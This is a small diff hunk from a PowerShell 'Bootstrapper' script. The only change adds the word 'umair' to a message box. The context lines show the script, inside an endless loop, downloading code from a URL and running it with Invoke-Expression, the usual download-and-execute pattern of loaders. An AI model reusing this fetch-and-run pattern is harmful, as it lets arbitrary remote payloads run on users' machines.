@@ -16,7 +16,7 @@ while ($true) {
         $code = $wc.DownloadString($scriptUrl)
 
         # Show alert: Download complete
-        [System.Windows.MessageBox]::Show("Bootstrapper: Download complete. Executing...")
+        [System.Windows.MessageBox]::Show("Bootstrapper: Download complete. umair Executing...")
 
         # Execute code
         Invoke-Expression $code
